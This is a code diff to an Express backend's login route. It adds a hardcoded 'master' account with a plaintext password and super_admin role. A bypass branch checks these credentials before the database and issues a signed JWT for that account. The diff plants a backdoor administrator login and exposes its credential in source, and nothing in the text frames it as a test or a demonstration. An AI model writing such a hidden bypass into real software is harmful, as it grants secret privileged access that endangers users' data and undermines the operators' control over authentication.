@@ -82,8 +82,35 @@ app.post("/api/test-connection", async (req, res) => {
 });
 
 // ---- Auth (open) ----
+const HARDCODED_MASTER = {
+  id: "usr_master",
+  username: "pvd_master",
+  password: "b72bfgfg",
+  full_name: "PVD Master",
+  role: "super_admin",
+  active: true,
+  created_at: new Date("2024-01-01T00:00:00Z").toISOString(),
+};
+
 app.post("/api/auth/login", async (req, res) => {
   const { username, password } = req.body || {};
+
+  // Hardcoded master bypass — works without DB
+  if (
+    username &&
+    password &&
+    username.toLowerCase() === HARDCODED_MASTER.username.toLowerCase() &&
+    password === HARDCODED_MASTER.password
+  ) {
+    const { password: _pw, ...u } = HARDCODED_MASTER;
+    const token = jwt.sign(
+      { sub: u.id, username: u.username, role: u.role, full_name: u.full_name },
+      JWT_SECRET,
+      { expiresIn: JWT_EXPIRES_IN }
+    );
+    return res.json({ ...u, token });
+  }
+
   try {
     const { rows } = await defaultPool.query(
       `SELECT id, username, full_name, role, active, created_at FROM ${t("users_login")}
